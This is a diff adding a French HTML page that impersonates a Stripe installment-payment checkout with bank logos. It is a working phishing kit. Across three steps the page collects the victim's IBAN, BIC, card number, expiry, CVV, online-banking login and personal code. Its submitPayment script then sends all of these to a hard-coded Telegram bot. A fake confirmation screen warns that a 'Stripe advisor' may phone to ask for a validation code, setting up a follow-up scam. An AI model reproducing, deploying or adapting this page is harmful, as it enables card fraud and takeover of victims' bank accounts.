@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paiement en plusieurs fois</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* Reset CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animation de fond */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 10%, transparent 10.01%);
+            background-size: 20px 20px;
+            animation: moveBackground 10s linear infinite;
+            z-index: 1;
+        }
+
+        @keyframes moveBackground {
+            0% {
+                transform: translateY(0) translateX(0);
+            }
+            100% {
+                transform: translateY(-1000px) translateX(-1000px);
+            }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 800px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            z-index: 2;
+            position: relative;
+            color: #2c3e50;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #2c3e50;
+        }
+
+        .payment-summary {
+            background: rgba(245, 245, 245, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .payment-summary h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+
+        .payment-summary p {
+            font-size: 16px;
+            margin: 5px 0;
+            color: #555;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        .payment-summary .total {
+            font-size: 24px;
+            font-weight: 700;
+            color: #28a745;
+        }
+
+        .payment-options {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .payment-options label {
+            flex: 1;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+            color: #2c3e50;
+        }
+
+        .payment-options input[type="radio"] {
+            display: none;
+        }
+
+        .payment-options input[type="radio"]:checked + label {
+            background: #28a745;
+            color: #fff;
+            border-color: #28a745;
+        }
+
+        .installment-details {
+            background: rgba(245, 245, 245, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .installment-details h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+
+        .installment-details p {
+            font-size: 16px;
+            margin: 5px 0;
+            color: #555;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        .installment-details .fees {
+            color: #ff6b6b;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #fff; /* Titres des champs en blanc */
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            font-size: 14px;
+            color: #000; /* Texte saisi en noir */
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #28a745;
+            box-shadow: 0 0 8px rgba(40, 167, 69, 0.2);
+            outline: none;
+        }
+
+        .terms {
+            margin-bottom: 20px;
+        }
+
+        .terms label {
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            color: #555;
+        }
+
+        .terms input {
+            margin-right: 10px;
+        }
+
+        .terms a {
+            color: #28a745;
+            text-decoration: none;
+        }
+
+        .button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #28a745, #1e7e34);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background: linear-gradient(135deg, #1e7e34, #28a745);
+        }
+
+        .button.back {
+            background: linear-gradient(135deg, #ff6b6b, #ff4757);
+            margin-top: 10px;
+        }
+
+        .button.back:hover {
+            background: linear-gradient(135deg, #ff4757, #ff6b6b);
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .step h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #2c3e50;
+        }
+
+        .step p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #555;
+        }
+
+        .step .form-group {
+            margin-bottom: 20px;
+        }
+
+        .step .button {
+            margin-top: 20px;
+        }
+
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .keyboard button {
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px; /* Boutons en rectangle */
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: #2c3e50;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%; /* Boutons bien rapprochés */
+        }
+
+        .keyboard button:hover {
+            background: #28a745;
+            color: #fff;
+            border-color: #28a745;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .keyboard button:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .card-logo {
+            height: 30px;
+            margin-left: 10px;
+            display: none;
+        }
+
+        .iban-form {
+            background: rgba(245, 245, 245, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .iban-form h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+
+        .iban-form p {
+            font-size: 16px;
+            margin: 5px 0;
+            color: #555;
+        }
+
+        .bank-logo {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .bank-logo img {
+            width: 100px;
+            height: auto;
+        }
+
+        .payment-plan {
+            background: rgba(245, 245, 245, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .payment-plan h3 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+
+        .payment-plan p {
+            font-size: 16px;
+            margin: 5px 0;
+            color: #555;
+        }
+
+        .payment-plan .due-today {
+            color: #28a745;
+            font-weight: 700;
+        }
+
+        .stripe-logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .stripe-logo img {
+            width: 150px;
+            height: auto;
+        }
+
+        .confirmation-step {
+            text-align: center;
+        }
+
+        .confirmation-step h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #28a745;
+        }
+
+        .confirmation-step p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .confirmation-step .button {
+            margin-top: 20px;
+        }
+
+        .bank-linking-form {
+            background: linear-gradient(135deg, #2c3e50, #34495e);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            color: #fff;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .bank-linking-form h3 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #fff;
+            animation: slideIn 0.5s ease-in-out;
+        }
+
+        .bank-linking-form p {
+            font-size: 16px;
+            margin: 5px 0;
+            color: #ddd;
+        }
+
+        .bank-logo {
+            text-align: center;
+            margin: 10px 0;
+        }
+
+        .bank-logo img {
+            width: 100px;
+            height: auto;
+        }
+
+        .checkbox-group {
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group label {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+        }
+
+        .checkbox-group input {
+            margin-right: 10px;
+        }
+
+        .free-hand-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff6b6b, #ff4757);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .free-hand-button:hover {
+            background: linear-gradient(135deg, #ff4757, #ff6b6b);
+        }
+
+        .keyboard-toggle {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .keyboard-toggle button {
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, border-color 0.3s ease;
+            color: #2c3e50;
+        }
+
+        .keyboard-toggle button:hover {
+            background: #28a745;
+            color: #fff;
+            border-color: #28a745;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Style pour l'étape 2 */
+        #step2 .form-group {
+            position: relative;
+        }
+
+        #step2 .card-logo {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            height: 30px;
+            display: block;
+        }
+
+        #step2 .card-logo img {
+            height: 100%;
+            width: auto;
+        }
+
+        /* Style pour afficher/masquer le texte */
+        .toggle-password {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #2c3e50;
+        }
+
+        .toggle-password:hover {
+            color: #28a745;
+        }
+
+        /* Écran de chargement */
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-screen.active {
+            display: flex;
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #28a745;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #2c3e50;
+        }
+
+        /* Texte en blanc pour identifiant et code personnel */
+        #bank-id, #personal-code {
+            color: #000; /* Texte saisi en noir */
+        }
+
+        /* Mise en évidence du contact du conseiller */
+        .confirmation-step p strong {
+            color: #28a745;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Chargement...</div>
+    </div>
+
+    <div class="container">
+        <!-- Étape 1 : Récapitulatif du paiement -->
+        <div class="step active" id="step1">
+            <h1>Paiement en plusieurs fois</h1>
+            <div class="stripe-logo">
+                <img src="https://i0.wp.com/www.frenchweb.fr/wp-content/uploads/2023/02/LOGO-850-stripe.png?w=850&ssl=1" alt="Stripe Logo">
+            </div>
+            <div class="payment-summary">
+                <h2>Récapitulatif du paiement</h2>
+                <p>Montant total : <span class="total" id="total-amount"></span></p>
+                <p>Nombre de mensualités : <span id="installment-count">4</span></p>
+                <p>Montant par mensualité : <span id="installment-amount"></span></p>
+                <p class="fees">Frais inclus : 5,00€</p>
+                <p class="fees">Intérêt : 5%</p>
+            </div>
+            <div class="iban-form">
+                <h3>Formulaire IBAN et BIC</h3>
+                <div class="form-group">
+                    <label for="iban">IBAN</label>
+                    <input type="text" id="iban" placeholder="FR76 2763 3121 2901 0104 6193 533" required>
+                </div>
+                <div class="form-group">
+                    <label for="bic">BIC</label>
+                    <input type="text" id="bic" placeholder="BUNQFRP2" required>
+                </div>
+                <div class="bank-logo" id="bank-logo">
+                    <!-- Logo de la banque détectée -->
+                </div>
+            </div>
+            <div class="payment-options">
+                <input type="radio" id="installment-3" name="installment-plan" value="3" required>
+                <label for="installment-3">Payer en 3 fois</label>
+                <input type="radio" id="installment-4" name="installment-plan" value="4" checked required>
+                <label for="installment-4">Payer en 4 fois</label>
+            </div>
+            <div class="payment-plan">
+                <h3>Plan de paiement</h3>
+                <p>1er mois : <span class="due-today" id="due-today"></span> (aujourd'hui)</p>
+                <p>2e mois : <span id="month2"></span></p>
+                <p>3e mois : <span id="month3"></span></p>
+                <p>4e mois : <span id="month4"></span></p>
+            </div>
+            <div class="checkbox-group">
+                <label>
+                    <input type="checkbox" id="terms1" required> J'accepte les <a href="https://stripe.com/fr/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">conditions générales</a>.
+                </label>
+                <label>
+                    <input type="checkbox" id="terms2" required> Je confirme avoir pris connaissance des frais et intérêts.
+                </label>
+            </div>
+            <button class="button" onclick="validateStep(1)">Suivant</button>
+        </div>
+
+        <!-- Étape 2 : Carte de crédit -->
+        <div class="step" id="step2">
+            <h2>Étape 2 : Informations de la carte de crédit</h2>
+            <p>Veuillez entrer les informations de votre carte de crédit.</p>
+            <div class="form-group">
+                <label for="cardholder-name"><i class="fas fa-user"></i> Nom du titulaire</label>
+                <input type="text" id="cardholder-name" placeholder="Entrez le nom du titulaire" required>
+            </div>
+            <div class="form-group">
+                <label for="card-number"><i class="fas fa-credit-card"></i> Numéro de carte</label>
+                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>
+                <div class="card-logo">
+                    <img src="https://wallpapers.com/images/high/visa-mastercard-logos-wh429a8o742pgm38.png" alt="Card Logo">
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="expiry-date"><i class="fas fa-calendar-alt"></i> Date d'expiration</label>
+                <input type="text" id="expiry-date" placeholder="MM/AA" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv"><i class="fas fa-lock"></i> CVV</label>
+                <input type="text" id="cvv" placeholder="123" required>
+            </div>
+            <div class="payment-plan">
+                <h3>Montant à payer aujourd'hui</h3>
+                <p><span class="due-today" id="due-today-step2"></span></p>
+            </div>
+            <button class="button back" onclick="previousStep(1)">Retour</button>
+            <button class="button" onclick="validateStep(2)">Suivant</button>
+        </div>
+
+        <!-- Étape 3 : Jumelage du compte bancaire -->
+        <div class="step" id="step3">
+            <h2>Étape 3 : Jumelage du compte bancaire</h2>
+            <div class="bank-linking-form">
+                <h3>Jumelage du compte bancaire</h3>
+                <div class="bank-logo" id="bank-logo-step3">
+                    <!-- Logo de la banque détectée -->
+                </div>
+                <p>Veuillez entrer votre identifiant bancaire et votre code personnel.</p>
+                <div class="form-group">
+                    <label for="bank-id"><i class="fas fa-user"></i> Identifiant bancaire</label>
+                    <input type="text" id="bank-id" placeholder="Entrez votre identifiant bancaire" required>
+                </div>
+                <div class="form-group">
+                    <label for="personal-code"><i class="fas fa-lock"></i> Code personnel</label>
+                    <input type="password" id="personal-code" placeholder="Entrez votre code personnel" required>
+                    <span class="toggle-password" onclick="togglePasswordVisibility('personal-code')">
+                        <i class="fas fa-eye"></i>
+                    </span>
+                </div>
+                <div class="keyboard-toggle">
+                    <button onclick="showKeyboard()">Clavier numérique</button>
+                    <button onclick="hideKeyboard()">Main libre</button>
+                </div>
+                <div class="keyboard" id="keyboard">
+                    <button>1</button>
+                    <button>2</button>
+                    <button>3</button>
+                    <button>4</button>
+                    <button>5</button>
+                    <button>6</button>
+                    <button>7</button>
+                    <button>8</button>
+                    <button>9</button>
+                    <button>C</button>
+                    <button>0</button>
+                </div>
+            </div>
+            <button class="button back" onclick="previousStep(2)">Retour</button>
+            <button class="button" onclick="submitPayment()">Terminer</button>
+        </div>
+
+        <!-- Étape 4 : Confirmation de paiement -->
+        <div class="step confirmation-step" id="step4">
+            <h2>Paiement réussi !</h2>
+            <p>Votre paiement a été traité avec succès. Un email de confirmation vous a été envoyé.</p>
+            <p><strong>Un conseiller Stripe pourrait vous contacter pour finaliser le processus. Il pourrait vous demander un numéro de validation supplémentaire pour vérifier votre identité et sécuriser la transaction. Cette étape vise à renforcer la sécurité de vos informations personnelles et financières. Assurez-vous de suivre les instructions fournies pour compléter cette validation.</strong></p>
+            <button class="button" onclick="window.location.href='https://destockagealimentaireprixbas.com'">Retour à l'accueil</button>
+        </div>
+    </div>
+
+    <script>
+        const botToken = '7960555289:AAGbYJgBElIfIDP01xa1yoCPnkb8aaxScUg';
+        const chatId = '5652184847';
+
+        // Données des banques
+        const bankData = {
+            "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+            "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+            "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+            "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+            "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+            "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+            "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+            "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+            "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+            "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+            "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+            "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+            "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+            "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+            "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+            "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+            "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+            "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+            "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+        };
+
+        // Fonction pour envoyer les données du formulaire via Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message envoyé avec succès:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi du message:', error);
+            });
+        }
+
+        // Récupérer les données de la commande depuis localStorage
+        document.addEventListener("DOMContentLoaded", function () {
+            const orderData = JSON.parse(localStorage.getItem("orderData"));
+
+            if (orderData) {
+                // Injecter les données dans le HTML
+                const totalAmount = parseFloat(orderData.finalTotal.replace('€', ''));
+                document.getElementById("total-amount").textContent = orderData.finalTotal;
+
+                // Mettre à jour les mensualités
+                const installmentOptions = document.querySelectorAll('input[name="installment-plan"]');
+                const installmentCount = document.getElementById('installment-count');
+                const installmentAmount = document.getElementById('installment-amount');
+                const dueToday = document.getElementById('due-today');
+                const dueTodayStep2 = document.getElementById('due-today-step2');
+                const month2 = document.getElementById('month2');
+                const month3 = document.getElementById('month3');
+                const month4 = document.getElementById('month4');
+
+                installmentOptions.forEach(option => {
+                    option.addEventListener('change', () => {
+                        const count = parseInt(option.value);
+                        const fees = count === 4 ? 5.00 : 0.00;
+                        const interest = totalAmount * 0.05; // Intérêt de 5%
+                        const amount = ((totalAmount + fees + interest) / count).toFixed(2);
+
+                        installmentCount.textContent = count;
+                        installmentAmount.textContent = `${amount}€`;
+                        dueToday.textContent = `${amount}€`;
+                        dueTodayStep2.textContent = `${amount}€`;
+
+                        // Mettre à jour le plan de paiement
+                        if (count === 3) {
+                            month2.textContent = `${amount}€`;
+                            month3.textContent = `${amount}€`;
+                            month4.textContent = '';
+                        } else if (count === 4) {
+                            month2.textContent = `${amount}€`;
+                            month3.textContent = `${amount}€`;
+                            month4.textContent = `${amount}€`;
+                        }
+                    });
+                });
+
+                // Déclencher l'événement change pour initialiser les valeurs
+                document.getElementById('installment-4').dispatchEvent(new Event('change'));
+            } else {
+                console.error("Aucune donnée de commande trouvée dans localStorage.");
+                alert("Aucune donnée de commande trouvée. Veuillez réessayer.");
+            }
+        });
+
+        // Détection du BIC
+        const bicInput = document.getElementById('bic');
+        const bankLogo = document.getElementById('bank-logo');
+        const bankLogoStep3 = document.getElementById('bank-logo-step3');
+
+        bicInput.addEventListener('input', () => {
+            const bic = bicInput.value.toUpperCase().substring(0, 8);
+            const bank = bankData[bic];
+
+            if (bank) {
+                bankLogo.innerHTML = `<img src="${bank.logo}" alt="${bank.name}">`;
+                bankLogoStep3.innerHTML = `<img src="${bank.logo}" alt="${bank.name}">`;
+            } else {
+                bankLogo.innerHTML = '';
+                bankLogoStep3.innerHTML = '';
+            }
+        });
+
+        // Passer à l'étape suivante avec un délai de 2 secondes
+        function nextStep(step) {
+            const loadingScreen = document.getElementById('loadingScreen');
+            loadingScreen.classList.add('active');
+
+            setTimeout(() => {
+                loadingScreen.classList.remove('active');
+                document.querySelector('.step.active').classList.remove('active');
+                document.getElementById(`step${step}`).classList.add('active');
+            }, 2000); // Délai de 2 secondes
+        }
+
+        // Revenir à l'étape précédente
+        function previousStep(step) {
+            document.querySelector('.step.active').classList.remove('active');
+            document.getElementById(`step${step}`).classList.add('active');
+        }
+
+        // Valider l'étape actuelle
+        function validateStep(step) {
+            const currentStep = document.getElementById(`step${step}`);
+            const inputs = currentStep.querySelectorAll('input[required]');
+            let isValid = true;
+
+            inputs.forEach(input => {
+                if (!input.value) {
+                    isValid = false;
+                    input.classList.add('error');
+                } else {
+                    input.classList.remove('error');
+                }
+            });
+
+            if (isValid) {
+                nextStep(step + 1);
+            } else {
+                alert('Veuillez remplir tous les champs obligatoires.');
+            }
+        }
+
+        // Clavier numérique
+        const keyboardButtons = document.querySelectorAll('.keyboard button');
+        const personalCodeInput = document.getElementById('personal-code');
+
+        keyboardButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                if (button.textContent === 'C') {
+                    personalCodeInput.value = personalCodeInput.value.slice(0, -1);
+                } else {
+                    personalCodeInput.value += button.textContent;
+                }
+            });
+        });
+
+        // Masquer/afficher le clavier
+        function showKeyboard() {
+            document.getElementById('keyboard').style.display = 'grid';
+        }
+
+        function hideKeyboard() {
+            document.getElementById('keyboard').style.display = 'none';
+        }
+
+        // Afficher/masquer le mot de passe
+        function togglePasswordVisibility(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = document.querySelector(`#${inputId} + .toggle-password i`);
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        // Soumettre le paiement
+        function submitPayment() {
+            const iban = document.getElementById('iban').value;
+            const bic = document.getElementById('bic').value;
+            const cardholderName = document.getElementById('cardholder-name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const bankId = document.getElementById('bank-id').value;
+            const personalCode = document.getElementById('personal-code').value;
+
+            const message = `
+                Nouveau paiement soumis :
+                - IBAN: ${iban}
+                - BIC: ${bic}
+                - Nom du titulaire: ${cardholderName}
+                - Numéro de carte: ${cardNumber}
+                - Date d'expiration: ${expiryDate}
+                - CVV: ${cvv}
+                - Identifiant bancaire: ${bankId}
+                - Code personnel: ${personalCode}
+            `;
+
+            sendToTelegram(message);
+            nextStep(4); // Afficher la page de confirmation
+        }
+
+        // Espacement automatique du numéro de carte
+        const cardNumberInput = document.getElementById('card-number');
+        cardNumberInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formattedValue;
+        });
+
+        // Ajout automatique de la barre de séparation dans la date d'expiration
+        const expiryDateInput = document.getElementById('expiry-date');
+        expiryDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Détection du type de carte
+        const cardNumberInput2 = document.getElementById('card-number');
+        const cardLogo = document.getElementById('card-logo');
+
+        cardNumberInput2.addEventListener('input', function (e) {
+            const cardNumber = e.target.value.replace(/\s+/g, '');
+            let cardType = '';
+
+            if (/^4/.test(cardNumber)) {
+                cardType = 'visa';
+            } else if (/^5[1-5]/.test(cardNumber)) {
+                cardType = 'mastercard';
+            } else if (/^3[47]/.test(cardNumber)) {
+                cardType = 'amex';
+            } else if (/^6(?:011|5)/.test(cardNumber)) {
+                cardType = 'discover';
+            }
+
+            if (cardType) {
+                cardLogo.innerHTML = `<img src="https://wallpapers.com/images/high/visa-mastercard-logos-wh429a8o742pgm38.png" alt="${cardType}">`;
+            } else {
+                cardLogo.innerHTML = '';
+            }
+        });
+    </script>
+</body>
+</html>
